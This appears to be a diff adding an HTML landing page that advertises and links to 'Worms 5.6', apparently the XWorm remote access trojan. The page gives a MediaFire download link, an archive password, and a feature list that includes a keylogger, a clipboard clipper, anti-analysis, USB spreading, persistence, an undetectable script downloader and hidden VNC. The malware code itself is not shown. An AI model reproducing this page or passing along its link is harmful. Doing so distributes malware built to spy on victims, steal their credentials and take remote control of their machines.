@@ -1,0 +1,293 @@
+<html><head><base href="https://worms-hack.example.com/">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Worms 5.6</title>
+<style>
+  :root {
+    --primary-color: #00c9ff;
+    --secondary-color: #00ff9d;
+    --accent-color: #9d00ff;
+    --background-color: #f0f8ff;
+    --text-color: #1a1a1a;
+    --border-color: #e0f0ff;
+  }
+  
+  body {
+    font-family: 'Roboto', sans-serif;
+    line-height: 1.6;
+    color: var(--text-color);
+    background-color: var(--background-color);
+    margin: 0;
+    padding: 0;
+    overflow-x: hidden;
+    display: flex;
+    min-height: 100vh;
+  }
+  
+  .side-border {
+    width: 20px;
+    background: linear-gradient(to bottom, var(--primary-color), var(--secondary-color));
+    box-shadow: inset 0 0 10px rgba(0,0,0,0.1);
+  }
+  
+  .main-content {
+    flex-grow: 1;
+    display: flex;
+    flex-direction: column;
+  }
+  
+  .container {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 20px;
+    flex-grow: 1;
+  }
+  
+  header {
+    background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+    text-align: center;
+    padding: 40px 0;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+    border-radius: 0 0 30px 30px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  
+  h1, h2 {
+    color: #ffffff;
+  }
+  
+  .logo {
+    width: 60px;
+    height: 60px;
+    margin-right: 10px;
+  }
+  
+  .glitch {
+    position: relative;
+    font-size: 3em;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    font-weight: bold;
+    color: #ffffff;
+    text-shadow: 2px 2px var(--accent-color);
+  }
+  
+  .glitch::before,
+  .glitch::after {
+    content: attr(data-text);
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+  }
+  
+  .glitch::before {
+    left: 2px;
+    text-shadow: -2px 0 var(--secondary-color);
+    clip: rect(24px, 550px, 90px, 0);
+    animation: glitch-anim-2 3s infinite linear alternate-reverse;
+  }
+  
+  .glitch::after {
+    left: -2px;
+    text-shadow: -2px 0 var(--accent-color);
+    clip: rect(85px, 550px, 140px, 0);
+    animation: glitch-anim 2.5s infinite linear alternate-reverse;
+  }
+  
+  @keyframes glitch-anim {
+    0% { clip: rect(58px, 9999px, 88px, 0); }
+    100% { clip: rect(97px, 9999px, 75px, 0); }
+  }
+  
+  @keyframes glitch-anim-2 {
+    0% { clip: rect(85px, 9999px, 32px, 0); }
+    100% { clip: rect(94px, 9999px, 71px, 0); }
+  }
+  
+  .download-section {
+    text-align: center;
+    padding: 40px 0;
+    background: linear-gradient(to bottom, rgba(255,255,255,0.1), rgba(255,255,255,0.3));
+    border-radius: 20px;
+    margin-top: 40px;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+  }
+  
+  .download-button {
+    display: inline-block;
+    background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+    color: #ffffff;
+    padding: 15px 30px;
+    text-decoration: none;
+    font-size: 18px;
+    transition: all 0.3s;
+    border-radius: 50px;
+    text-transform: uppercase;
+    font-weight: bold;
+    letter-spacing: 1px;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+  }
+  
+  .download-button:hover {
+    background: linear-gradient(45deg, var(--secondary-color), var(--primary-color));
+    box-shadow: 0 5px 15px rgba(0,201,255,0.4);
+    transform: translateY(-2px);
+  }
+  
+  .features {
+    background-color: #ffffff;
+    padding: 30px;
+    border-radius: 20px;
+    margin-top: 30px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+  }
+  
+  .features h3 {
+    color: var(--primary-color);
+    border-bottom: 2px solid var(--primary-color);
+    padding-bottom: 10px;
+    margin-top: 20px;
+  }
+  
+  .features ul {
+    list-style-type: none;
+    padding-left: 0;
+  }
+  
+  .features li {
+    margin-bottom: 10px;
+    position: relative;
+    padding-left: 25px;
+  }
+  
+  .features li::before {
+    content: "⚡";
+    position: absolute;
+    left: 0;
+    color: var(--accent-color);
+  }
+  
+  .screenshots {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    margin-top: 30px;
+  }
+  
+  .screenshots img {
+    width: 90%;
+    max-width: 800px;
+    height: auto;
+    border-radius: 20px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    transition: all 0.3s;
+    border: 3px solid var(--primary-color);
+    margin-bottom: 20px;
+  }
+  
+  .screenshots img:hover {
+    transform: scale(1.02);
+    box-shadow: 0 15px 40px rgba(0,0,0,0.3);
+    border-color: var(--secondary-color);
+  }
+
+  .screenshots img.smaller {
+    width: 60%;
+    max-width: 600px;
+  }
+
+  .password-info {
+    text-align: center;
+    margin-top: 20px;
+    font-size: 18px;
+    color: var(--primary-color);
+    font-weight: bold;
+  }
+
+  @media (max-width: 768px) {
+    .screenshots img {
+      width: 100%;
+    }
+    .screenshots img.smaller {
+      width: 80%;
+    }
+    .side-border {
+      width: 10px;
+    }
+    header {
+      flex-direction: column;
+    }
+    .logo {
+      margin-right: 0;
+      margin-bottom: 20px;
+    }
+  }
+</style>
+</head>
+<body>
+  <div class="side-border"></div>
+  <div class="main-content">
+    <div class="container">
+      <header>
+        <img src="https://camo.githubusercontent.com/0195493420e92ed8749ef90e6e7e55dd48438c0c6fa397a9ce47ea553a1138f2/68747470733a2f2f692e696d6775722e636f6d2f71584e55616e732e706e67" alt="Worms Logo" class="logo" width="60" height="60">
+        <h1 class="glitch" data-text="Worms 5.6">Worms 5.6</h1>
+      </header>
+
+      <main>
+        <section class="download-section">
+          <a href="https://www.mediafire.com/file/3krvsu3nffxh8l4/XWorm-5.6-main.rar/file" class="download-button" target="_blank">DOWNLOAD Worms 5.6</a>
+          <p class="password-info">Archive password: @XCoder</p>
+        </section>
+
+        <section class="features">
+          <h3>⚪ Builder Features</h3>
+          <ul>
+            <li>AntiKill - TBot Notify - Clipper - WDEX - Keylogger - Anti Analysis</li>
+            <li>Schtasks - Startup - Registry</li>
+            <li>USB Spread - Icon - Assembly - Obfuscator</li>
+            <li>Icon Pack</li>
+          </ul>
+
+          <h3>⚪ Connection</h3>
+          <ul>
+            <li>Stable Connection - Encrypted Connection</li>
+          </ul>
+
+          <h3>⚪ Tools</h3>
+          <ul>
+            <li>Icon Changer - Multi Binder [Icon - Assembly]</li>
+            <li>Fud Downloader [HTA-VBS-JS-WSF] - XHVNC - BlockClients</li>
+          </ul>
+
+          <h3>⚪ Left Click</h3>
+          <ul>
+            <li>Limitless Features</li>
+          </ul>
+        </section>
+
+        <section class="screenshots">
+          <img alt="Interface de Worms 5.6 montrant les options de configuration" src="https://camo.githubusercontent.com/55ebc18be9522ddd795c821270c80d8f0fe1e826b51663bdc015ca29a70d6933/68747470733a2f2f692e6962622e636f2f594253684d78682f7373686f742d31342e706e67" width="800" height="600">
+          <img class="smaller" alt="Panneau de contrôle Worms 5.6 avec liste de connexions" src="https://camo.githubusercontent.com/af70635b9c72b020a2b301cf75629b1c817cfb38b40e4e3004daf5781c9ec925/68747470733a2f2f692e6962622e636f2f437448585031542f7373686f742d31332e706e67" width="600" height="450">
+          <img alt="Interface de gestion des clients Worms 5.6" src="https://camo.githubusercontent.com/4eb3d46322960629449c1eae983905a33305320d2705cfcf0f40ee447d16bdd1/68747470733a2f2f692e6962622e636f2f327633765063542f7373686f742d322e706e67" width="800" height="600">
+          <img alt="Écran de configuration avancée de Worms 5.6" src="https://camo.githubusercontent.com/5732bbdbf166758efcc6b04ac9564807730c93a9324ae02eeefdbe6f56066e46/68747470733a2f2f692e6962622e636f2f53646d7943706e2f7373686f742d352e706e67" width="800" height="600">
+          <img alt="Dashboard principal de Worms 5.6" src="https://camo.githubusercontent.com/62b02af3202145078e0b1bd8af852f591438a971b7eebf3cdf68d7cf656de47b/68747470733a2f2f692e6962622e636f2f535153364b446e2f7373686f742d342e706e67" width="800" height="600">
+        </section>
+      </main>
+    </div>
+  </div>
+  <div class="side-border"></div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const downloadButton = document.querySelector('.download-button');
+      downloadButton.addEventListener('click', function(e) {
+        // Removed the preventDefault() to allow the link to work normally
+      });
+    });
+  </script>
+</body>
+</html>
